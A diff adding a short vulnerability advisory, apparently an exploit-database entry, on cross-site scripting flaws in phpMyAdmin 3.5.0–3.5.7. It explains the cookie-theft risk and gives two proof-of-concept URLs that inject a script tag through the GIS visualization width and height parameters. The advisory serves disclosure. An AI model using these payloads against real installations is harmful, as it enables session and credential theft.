@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/58962/info
+
+phpMyAdmin is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+phpMyAdmin 3.5.0 through versions 3.5.7 are vulnerable. 
+
+http://www.example.com/PMA/tbl_gis_visualization.php?db=information_schema&token=17961b7ab247b6d2b39d730bf336cebb&visualizationSettings[width]="><script>alert(123);</script>
+
+http://www.example.com/PMA/tbl_gis_visualization.php?db=information_schema&token=17961b7ab247b6d2b39d730bf336cebb&visualizationSettings[height]="><script>alert(123);</script> 
